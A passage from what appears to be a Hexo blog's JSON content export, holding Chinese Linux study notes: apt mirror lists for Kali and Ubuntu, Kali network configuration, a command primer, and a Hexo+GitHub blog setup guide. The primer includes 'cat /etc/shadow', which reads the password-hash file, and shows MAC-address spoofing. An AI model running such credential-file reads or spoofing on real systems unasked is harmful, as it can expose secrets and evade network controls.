Linux","slug":"Linux/Kali-Linux","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/"}],"tags":[{"name":"ssh","slug":"ssh","permalink":"https://lacc233.github.io/tags/ssh/"}]},{"title":"镜像源更新","slug":"镜像源更新","date":"2019-03-20T00:06:19.000Z","updated":"2020-06-15T05:26:52.782Z","comments":true,"path":"categories/Linux/镜像源更新/","link":"","permalink":"https://lacc233.github.io/categories/Linux/%E9%95%9C%E5%83%8F%E6%BA%90%E6%9B%B4%E6%96%B0/","excerpt":"kali源：用于kali更新，也可在ubunto和debian上安装kali工具","text":"kali源：用于kali更新，也可在ubunto和debian上安装kali工具 ubuntu更新源清华大学开源软件镜像站 点击问号 选择版本 1sudo apt-get update 相关命令 sudo apt-get update 更新源 sudo apt-get install package 安装包 sudo apt-get remove package 删除包 sudo apt-cache search package 搜索软件包 sudo apt-cache show package 获取包的相关信息，如说明、大小、版本等 sudo apt-get install package –reinstall 重新安装包 sudo apt-get -f install 修复安装 sudo apt-get remove package –purge 删除包，包括配置文件等 sudo apt-get build-dep package 安装相关的编译环境 sudo apt-get upgrade 更新已安装的包 sudo apt-get dist-upgrade 升级系统 sudo apt-cache depends package 了解使用该包依赖那些包 sudo apt-cache rdepends package 查看该包被哪些包依赖 sudo apt-get source package 下载该包的源代码 sudo apt-get clean &amp;&amp; sudo apt-get autoclean 清理无用的包 sudo apt-get check 检查是否有损坏的依赖 kali更新源升级补丁,保持系统最新 1vim /etc/apt/sources.list #修改 更新源 文件 更新源 1234567891011121314151617181920212223242526272829303132#中科大deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib #阿里云deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib #清华大学deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-freedeb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free #浙大deb http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-freedeb-src http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;kali kali-rolling main contrib non-free #东软大学deb http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib #官方源deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contribdeb-src http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie main non-free contribdeb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-updates main non-free contribdeb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-backports main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-updates main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian&#x2F; jessie-backports main non-free contribdeb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security&#x2F; jessie&#x2F;updates main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security&#x2F; jessie&#x2F;updates main non-free contrib 12apt-get update #更新索引apt-get upgrade #根据索引，真正更新 在ubuntu,debian上更换源后，更新索引需要添加秘钥 1sudo apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6","categories":[{"name":"Linux","slug":"Linux","permalink":"https://lacc233.github.io/categories/Linux/"}],"tags":[]},{"title":"kali之网络配置","slug":"kali之网络配置","date":"2019-03-20T00:04:14.000Z","updated":"2020-06-15T05:29:08.440Z","comments":true,"path":"categories/Linux/Kali-Linux/kali之网络配置/","link":"","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/kali%E4%B9%8B%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/","excerpt":"基础配置","text":"基础配置 网络配置 临时ip地址 12345678910ifconfig eth0 #查询eth0网卡配置dhclient eth0 #向DHCP服务器发送请求自动获得IP地址 ，执行此步需要网卡配置为动态获取（dhcp） ifconfig eth0 192.168.1.10/24 #指定获得ip地址route add default gw 192.168.1.1 #指定网关netstat -nr #查询网关 route -n 添加路由,内部网段（网络地址，不是主机地址/32），网关，网卡 1route add -net 192.168.0.0&#x2F;24 gw 192.168.1.100 eth0 配置DNS 12345vim etc/resolv.confnamaserver 8.8.8.8namaserver 114.114.114.114或echo nameserver 192.168.1.1 &gt; /etc/resolv.conf 这些ifconfig分配的IP和DNS在修改后从开机又会返回原值因此可在静态模式下，制定自己的网卡 网卡配置文件 1vim /etc/nerwork/interfaces 默认为动态 123456# The loopback network interfaceauto loiface lo inet loopbackauto eth0iface eth0 inet dhcp 静态为： 12345678910111213141516171819# The loopback network interfaceauto loiface lo inet loopbackauto eth0iface eth0 inet staticaddress 172.28.34.88 #ipnetmask 255.255.255.192 #子网掩码gateway 172.28.34.126 #网关#以下也可写在该网卡配置文件中dns-namaservers 192.168.0.10 192.168.0.20 #dns服务器开机自动添加到dns文件内#up route add -net 172.168.5.0/24 gw 192.168.10.100 eth1 #开机添加路由配置#down route del -net 172.168.0.0/24 #关机删除掉路由配置#下面这两个可以不设置#network 192.168.20.0 #网络地址#broadcast 192.168.20.255 #广播地址 在虚拟机里，切换到桥接网卡，这个网卡静态配置即可生效 sudo /etc/init.d/networking restart 配置完静态重启一下网络服务","categories":[{"name":"Linux","slug":"Linux","permalink":"https://lacc233.github.io/categories/Linux/"},{"name":"Kali Linux","slug":"Linux/Kali-Linux","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/"}],"tags":[]},{"title":"linux基础","slug":"linux学习笔记","date":"2019-03-20T00:00:32.000Z","updated":"2020-06-15T05:27:25.075Z","comments":true,"path":"categories/Linux/linux学习笔记/","link":"","permalink":"https://lacc233.github.io/categories/Linux/linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"linux基础知识","text":"linux基础知识 目录结构bin 放普通用户也可以使用的命令sbin 放管理员才可以执行的命令boot 放启动(引导)配置文件dev 放存储设备的，例硬盘etc 放系统和应用程序的配置文件home 普通用户家目录lib 放函数库文件lib64 放64位函数库文件live-build build自己kali版本lost found 出现问题，错误，丢失的文件目录media mnt 挂载外来存储介质opt 安装外围的大型程序的proc 开机生成的配置文件root 主目录selinux linux的安全机制srv sys tmp 临时目录usr 也可安装外围程序var 存放经常变化的如日志，邮件的目录 求助命令指令的 –help 求助说明几乎linux上指令，在开发的时候，就被开发者将指令的语法与参数写入指令的操作过程中了 1ls --help 只能用来查询指令，一般用来做协助查询 man pageman 是 manual(操作说明)的简写； 1man ls 左上角的【ls(1)】(1)解释如下: 代号 代表内容 1 用户在shell环境中可以操作的指令或可执行文件 … … 5 配置文件或者是某些文件的格式 … … 8 系统管理员可使用的管理命令 … … man page内大致内容如下(前四个重要) 代号 内容 NAME 简短的指令，数据名称说明 SYNOPSIS 简短的指令下达语法 DESCRIPTION 较为完整的说明 OPTIONS 针对SYNOPSIS 中，列举出所有可用的选项的说明 man page 常用按键： 按键 反应 空格键 向下翻一页 [Page Down] 向下翻一页 [Page Up] 向上翻一页 [Home] 去到第一页 [End] 去到最后一页 /关键字 向下搜索 ?关键字 向上搜索 n,N 在 ？和 / 的基础上 n向下一个搜索，N反向搜索 q 退出 搜索特定的指令/文件的man page说明文件 123man -f man #等同 whatis [指令或是数据]（只能root用户使用）man 1 manman 7 man 1man -k man #搜列出所有含有关键字的说明文件，相当于 apropos [指令或是数据] (root用户) info page（kali无info）查询指令和文件的格式，与 man 相似，但是拆分为不同的节点 1info info 非联网的说明文件1/usr/share/doc 熟悉命令 命令字 [选项] [参数]linux 命令：用于实现某一功能的指令或程序，执行依赖于解释器程序，（/bin/bash）man 指令 #查询指令用法指令 –help #查询指令选项 unameuname -r //系统内核uname -a //系统详细信息which uname //查看位置 hostnemahostname //主机名 mkdir创建目录-p 递归创建 touch创建文件 ls浏览目录-l 长格式显示文件名，d-目录，-普通文件，c-字符型设备，l-链接文件，b-块设备（sda）f-堆栈文件，p-命令管道。s、p：这些文件关系到系统的数据结构和管道(pipe)，通常很少见到。 drwxr-xr-x第一个字符后面有三个字符组，分别表示文件拥有者，文件用户组，系统其他用户。-a 多显示出以.命名的隐藏文件-h 显示大小，（3M)-R 递归浏览 –fulll-time 完整时间 1ls -lh --sort=size # 以文件大小排序,size可换为time,按时间排 cd进入目录. 当前目录.. 这个目录的上个目录 ln为文件或目录建立链接（link）-s 建立软链接文件（省略此项则显示硬链接） cp复制-r 递归复制整个目录树-p 保持源文件的属性不变-f 强制覆盖目录目标同名文件或目录-i 需要覆盖文件或目录时进行提醒 1cp ps ps1 # 拷贝ps 命名为ps1 rm-f 强行删除文件或目录，不进行提醒-i 删除文件或目录时提醒用户确定-r 递归删除整个目录树 mv移动 pwd查看当前的工作目录 cat查看文本文件内容，全部显示which catcat /etc/passwdcat /etc/shadow-n 显示行号 123date &gt; 1cat 1 2cat 1 2 &gt; 3 //合并 more按百分比显示文本内容，逐屏显示，enter:查看下一页， q: 退出 less不显示百分比，和more 类似，显示目录位置,q退出 tail默认显示最后10行-20 显示最后20行 1watch -n 2 tail -20 /var/log/messages # 每隔两秒显示查看日志变化最后20行（实时查看系统日志变化）有的发行版没有messages这个文件。 du统计目录及文件的空间占用情况 wc统计文件中行数，单词数量，字符数-l 行数-w 单词数-c 字符数 12wc 1.txt 会出现2 4 262是行数，4是单词数，26是字符数 find查找find [查找范围] [查找条件]-name 按文件名称查找-size 按大小查找-user 按文件属主查找-type 按文件类型查找 1find /etc -name \"resol*.conf\" 12find / -iname namp #从/查找不分大小写的nampfind . -name \"ps*\" -exec cp &#123;&#125; /tmp//&#123;&#125;.bak \\: #从本目录下搜索ps开头的文件，并拷贝到目标目录 -iname: 不分大小写， -name: 分大小写 whereis查找 如果是源码安装，不是本地包管理安装，会查找不到如果在whereis的数据库里（本地安装回生成一个whereis数据库），比find快updatedb 更新数据库-b 二进制文件 top监视系统性能参数 q退出，输入k 结束某进程 ps显示进程-ef 详细显示aus 显示的列信息稍有不同 grep筛选显示的内容配角：cat 12cat /etc/passwd # 查看操作系统的本地账号grep ssh /etc/passwd #只显示包含ssh的内容 awk 指定列 123456789awk '&#123;print $1&#125;' #获取第一列awk '&#123;print $1, $2, $3&#125;' #获取第一列，第二列，第三列awk 'NR==1&#123;print $1, $2, $3&#125;' #获取第一行的第一列，第二列，第三列awk 'END&#123;print NR&#125;' #获取行数NRawk 'END&#123;print NF&#125;' #获取列数NF（这里是获取最后一行的列数，注意每行的列数可能是不同的）awk '&#123;print $NF&#125;' #获取最后一列awk '&#123;print $1&#125;' fileName #对文件进行操作awk -F':' '&#123;print $1&#125;' #指定分隔符（这里以:分割）awk '&#123;print $100&#125;' #超出范围不报错 sed 指定行 123sed -n 2p #指定第一行(sed -n 指定行数)sed -n 1,10p #第一至十行sed -n 1,100p #超出范围不报错，第一行是1不能是0，否则报错 ifconfig配角：maccharger 123ifconfig eth0 down #down掉eth0,再改Mac地址时，需要先执行这步maccharger -m 00:11:11:11:11:11 eth0 #改Mac地址ifconfig eth0 up #up eth0 修改的Mac只有在本次使用，改过后可能会上不了网，因为无线路由器绑定了mac地址，下次开机会恢复真实值 netstat查看网络的连接信息配角： egrep awk cut sort unip &gt; |-pantu tu为tcp,udp连接信息 1netstat -pantu | egrep -v '0.0.0.0|:::' | awk '&#123;print $5&#125;' | egrep 'and|Address' | cut -d ':' -f 1 | sort | uniq &gt; ip 命令行解读:查看tcp,udp连接信息，筛除掉0.0.0.0和:::的信息,只显示第五块（列）,又筛除and和Address, 查看以”:”为界分的第一块，排序，重复只显示一次，最终 覆盖 输出到ip内.“&gt;”改为”&gt;&gt;”追加输出到ip内。awk 和 cut 都是对行操作。管道：| 将多个命令在同一行输入，可以协作。 mount挂载目录操作 1mount -o loop klai.iso /media/cdrom #将kali.iso挂载到目标目录下 dmesg查看message内容 echo在当前窗口显示某些信息 1echo \"hello world!\" ping-c 次数 cal查看日历 date查看时间 压缩 归档12gzip ***.gz gzip -d ***.gz 12bzip2 ***.gzbzip2 -d ***.gz tar归档-c 创建归档文件-v 输出详细信息-f 表示使用归档文件-x 解开归档文件-t 列表查看包内的文件（不释放解包）-C 指定释放位置-p 解包时保留原始文件及目录的权限-z/j 调用gzip/bzip2程序 进行解压或压缩 123456789#归档打包，解包tar -cvf 4.tar 1 2 3 //将文件1 2 3 打包归档为4.tartar -xvf 4.tar //解包归档文件4.tar #压缩，解压gzip 4.tar 4.tar.gz tar zxvf 4.tar.gz //解压#压缩，解压bzip2 4.tar 4.tar.bz2tar jxvf 4.tar.bz2 //解压 管道符；无逻辑关系，顺序执行| 依次执行，每个都执行，前一个的正确输出作后一个的操作对象&amp; 依次执行，每个都执行&amp;&amp; 逻辑与，依次执行，执行成功则下一个，失败则退出|| 逻辑或，依次执行，执行成功则退出，失败则下一个 关机重启halt：关机reboot:重启 123who 查看目前有谁在线netstat -a #查看联机状态ps -aus #后台执行的程序 指令 作用 sync 数据同步写入磁盘 shutdown 常用关机命令 halt 关机命令，进入系统停止的模式 poweroff 关机命令，进入关机模式，直接关机没有提供电力欧 reboot 直接重启 suspend 进入休眠模式 关机指令大同小异，习惯用哪个就用哪个 shutdown -h 20:35 关机+时间 -r +30 “the system will reboot” 重启+时间 -k now “the system will reboot” 警告，但不会真关机，吓唬人的 安装软件rpm红帽的包格式aptyumdpkg vim set mouse-=a #鼠标右键全部功能开启，可跨文本 命令模式dd //删除光标行（剪切）ndd //删除多行， 例2ddu //撤销p //（剪切后）粘贴D //从光标处删除至行尾 A 行尾I 行首a 光标后i 光标前O 上一行插入o 下一行插入 插入模式esc返回命令模式 底行模式 12345678910: set nu: wq: q!: w/ 关键字 #向下搜索 n 下一个？关键字 #向上搜索: %s/XX/YY/g #全文替换,XX改为YY,g为不提示: 1,5s/XX/YY/g #1到5行: . #重复上一条命令: u #消上一条命令 shell快捷键ctrl+l:清屏ctrl+u/k:清空至行首/尾:强行换行tab：命令补全,文件补齐Ctrl+c：退出，相当于exitCtrl+ins：vim模式复制，相当于普通模式的 Ctrl+cShift+ins：vim模式粘贴，相当于普通模式的 Ctrl+vShift+PgUp/PgDn：上下翻页 改变文件属性与权限chgrp ：改变文件所属群组chown ：改变文件拥有者chmod ：改变文件的权限, SUID, SGID, SBIT 等等的特性 chgrp 要被改变的组名必须要在/etc/group 文件内存在才行，否则就会显示错误chown 要注意的是， 用户必须是已经存在系统中的账号，也就是在/etc/passwd 这个文件中有纪录的用户名称才能改变 改变群组1chgrp [-R] 群组名 文件或目录 选项与参数：-R : 进行递归(recursive)的持续变更，亦即连同次目录下的所有文件、目录都更新成为这个群组之意。常常用在变更某一目录内所有的文件之情况。 拷贝文件，改变所属：123cp .bashrc .bashrc_testls -la .bashrc* #查看到仍然属于rootchown bin .bashrc 改变权限数字类型改变文件权限 1chmod [-R] xyz 文件或目录 选项与参数：xyz : 就是刚刚提到的数字类型的权限属性，为 rwx 属性数值的相加。r:4,w:2,x:1-R : 进行递归(recursive)的持续变更，亦即连同次目录下的所有文件都会变更 每种身份(owner/group/others)各自的三个权限(r/w/x)分数是需要累加的，例如当权限为： [-rwxrwx—] 分数则是：owner = rwx = 4+2+1 = 7group = rwx = 4+2+1 = 7others= — = 0+0+0 = 0所以等一下我们设定权限的变更时，该文件的权限数字就是 770 啦！变更权限的指令 chmod 的语法是这样的： 1chmod [-R] 770 文件或目录 符号类型改变文件权限u:user,g:grope,e:others,a:all+:加入，-：除去，=：设定 123chmod u&#x3D;rwx,go&#x3D;rx .bashrc #注意喔！那个 u&#x3D;rwx,go&#x3D;rx 是连在一起的，中间并没有任何空格符！chmod a+w .bashrc #全部加写权限ls -al .bashrc 对于文件的 rwx 来说， 主要都是针对『文件的内容』而言，与文件档名的存在与否没有关系喔！因为文件记录的是实际的数据嘛 组件 内容 迭代物件 r w x 文件 详细资料data 文件文件夹 读到文件内容 修改文件内容 执行文件内容 目录 档名 可分类抽屉 读到档名 修改档名 进入该目录的权限(key) 默认文件权限123umask #查看当前默认权限umask -S #查看详细权限信息umask 022 隐藏属性12345chattr +a filename #文件可追加，不可覆盖 -i filename #文件不可做修改，删除lsattr -a #查看文件全部隐藏属性 -d #若是文件夹，则只查看文件夹隐藏属性 -R #递归 特殊权限有以下这些特殊权限：SUID，SGID，SBITSet UID：当一个档案的拥有者的x权限位上是 s 的时候，此时被称为Set UID ,简称SUID的特殊权限。SUID有以下限制和功能： SUID权限仅对二进制程序有效，执行者对于该程序需要具有x的权限，本权限仅在执行该程序过程中有效，执行者将具有该程序拥有者的权限Set GID：当一个档案的用户组的 x 权限位为 s 的时候，此时被称为Set GID，简称SGID。SGID有如下功能: SGID对二进制程序有用，程序执行者对于该程序，需要具备x的权限，执行者在执行程序的过程中会获得该程序用户组的权限SBIT：只对目录有效，对文件无效。作用是： 当用户对此目录具有wx权限，即有写入权限时，当用户在该目录下建立目录或者文件时，仅有自己和root才有权力删除。那么如何配置SUID与SGID呢？用数字权限法，在原来的三个数字之前再加一个数字，它们的值分别是：SUID :4 ；SGID：2 ；SBIT：1 。 环境变量1echo $PATH 添加环境变量,将root目录添加到PATH中，可以在任何目录下，执行root目录下的命令 1PATH=“$&#123;PATH&#125;:/root” tmp是任何用户都能访问的目录，若将.目录加入到PATH中，则会变得很危险。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://lacc233.github.io/categories/Linux/"}],"tags":[]},{"title":"博客搭建","slug":"博客搭建","date":"2018-12-08T04:11:03.000Z","updated":"2020-05-10T12:56:45.010Z","comments":true,"path":"categories/博客搭建/博客搭建/","link":"","permalink":"https://lacc233.github.io/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","excerpt":"Hexo + Github 搭建 Blog 和 每次博客的部署","text":"Hexo + Github 搭建 Blog 和 每次博客的部署 准备工作1.安装git git下载地址：链接安装后验证 1$ git --version 出现类似下面的版本号，皆为成功git version 2.19.2.windows.1 2.安装node（其附带npm） node.js下载地址：链接安装后验证 1$ node -v 出现类似下面的版本号(安装最新版本)：v10.14.1 3.安装Hexo命令行输入： 1$ npm install -g hexo-cli 4.创建本地运行库 创建本地仓库文件夹：例F:\\github右键点击该文件夹，Git Bash Here，命令行输入 1$ hexo init myblog 初始化完成！ 本地试运行1.进入博客根目录（myblog） 1cd myblog 2.安装 1npm install 3.运行本地运行(如果4000端口被占用，使用 hexo service -p 5000 修改端口) 1$ hexo server 此时在浏览器输入 http://localhost:4000/ ,访问到博客界面 部署在远程库这里将其部署在github上 1.创建Github账户 略，随便百度一下 2.创建github项目 创建一个名为yourname.github.io的项目（yourname为你github名） 3.生成密钥，用于ssh连接 在本地，右键网站根目录，点击Git Bash 输入下列命令yourname 即为github注册时的用户名youremail 为注册时的邮箱账号第三条命令生成密钥： 123$ git config --global user.name \"yourname\"$ git config --global user.email \"yourEmail\"$ ssh-keygen -t rsa -C \"yourEmail\" 此时在C:\\Users下你的当前账户文件夹下会有一个 .ssh 文件，找到id_rsa.pub文件，复制里面的内容，粘贴至GitHub中（点击右上角用户头像下的Settings，之后点击左侧的SSH and GPG keys，找到New SSH key点击，输入title，并将之前复制的内容粘贴到下面的key中），最后点击Add SSH key，完成。 4.修改配置文件 去博客根目录下的_config.yml文件中，添加如下（yourname就是GitHub的用户名）： 1234deploy: type: git repo: git@github.com:yourname/yourname.github.io.git branch: master 5.将本地仓库同步到github 在第一次生成以及部署之前，需要安装一个扩展： 1$ npm install hexo-deployer-git --save 清除生成的静态网页缓存数据 1$ hexo clean 生成文章对应的静态页面 1$ hexo g 部署本地站点到github命令 1$ hexo deploy","categories":[{"name":"博客搭建","slug":"博客搭建","permalink":"https://lacc233.github.io/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}],"tags":[]}],"categories":[{"name":"网络协议","slug":"网络协议","permalink":"https://lacc233.github.io/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"},{"name":"工具","slug":"工具","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/"},{"name":"Linux","slug":"Linux","permalink":"https://lacc233.github.io/categories/Linux/"},{"name":"Kali Linux","slug":"Linux/Kali-Linux","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/"},{"name":"应用安全风险","slug":"应用安全风险","permalink":"https://lacc233.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/"},{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"python","slug":"python","permalink":"https://lacc233.github.io/categories/python/"},{"name":"靶场","slug":"靶场","permalink":"https://lacc233.github.io/categories/%E9%9D%B6%E5%9C%BA/"},{"name":"WriteUp","slug":"WriteUp","permalink":"https://lacc233.github.io/categories/WriteUp/"},{"name":"Windows","slug":"Windows","permalink":"https://lacc233.github.io/categories/Windows/"},{"name":"脚本","slug":"脚本","permalink":"https://lacc233.github.io/categories/%E8%84%9A%E6%9C%AC/"},{"name":"博客搭建","slug":"博客搭建","permalink":"https://lacc233.github.io/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"命令","slug":"命令","permalink":"https://lacc233.github.io/tags/%E5%91%BD%E4%BB%A4/"},{"name":"注入","slug":"注入","permalink":"https://lacc233.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"https://lacc233.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"name":"逻辑漏洞","slug":"逻辑漏洞","permalink":"https://lacc233.github.io/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"sql注入","permalink":"https://lacc233.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"proxifier","slug":"proxifier","permalink":"https://lacc233.github.io/tags/proxifier/"},{"name":"python3","slug":"python3","permalink":"https://lacc233.github.io/tags/python3/"},{"name":"vulhub","slug":"vulhub","permalink":"https://lacc233.github.io/tags/vulhub/"},{"name":"CTF","slug":"CTF","permalink":"https://lacc233.github.io/tags/CTF/"},{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://lacc233.github.io/tags/CTF-Web/"},{"name":"arp","slug":"arp","permalink":"https://lacc233.github.io/tags/arp/"},{"name":"汇编","slug":"汇编","permalink":"https://lacc233.github.io/tags/%E6%B1%87%E7%BC%96/"},{"name":"vim","slug":"vim","permalink":"https://lacc233.github.io/tags/vim/"},{"name":"CSRF","slug":"CSRF","permalink":"https://lacc233.github.io/tags/CSRF/"},{"name":"xss","slug":"xss","permalink":"https://lacc233.github.io/tags/xss/"},{"name":"python脚本","slug":"python脚本","permalink":"https://lacc233.github.io/tags/python%E8%84%9A%E6%9C%AC/"},{"name":"python","slug":"python","permalink":"https://lacc233.github.io/tags/python/"},{"name":"ssh","slug":"ssh","permalink":"https://lacc233.github.io/tags/ssh/"}]}